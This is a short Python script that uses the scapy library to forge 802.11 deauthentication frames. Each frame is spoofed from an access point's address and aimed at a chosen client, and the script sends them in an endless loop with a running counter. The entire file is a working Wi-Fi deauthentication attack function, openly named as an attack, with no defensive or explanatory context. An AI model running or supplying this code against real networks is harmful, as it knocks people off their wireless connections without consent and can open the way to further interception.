from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

def atkDeauth(vicAddr:str, bssAddr:str):
    conf.verb = 0

    packet = RadioTap() /\
        Dot11(type=0, subtype=12, addr1=vicAddr, addr2=bssAddr, addr3=bssAddr) /\
        Dot11Deauth(reason=7)

    loop = 0
    while(True):
        sendp(packet)
        loop += 1
        print(str(loop) + '. Deauthentication Frame Sent. (AP='+bssAddr + ' -> CLI='+vicAddr+')')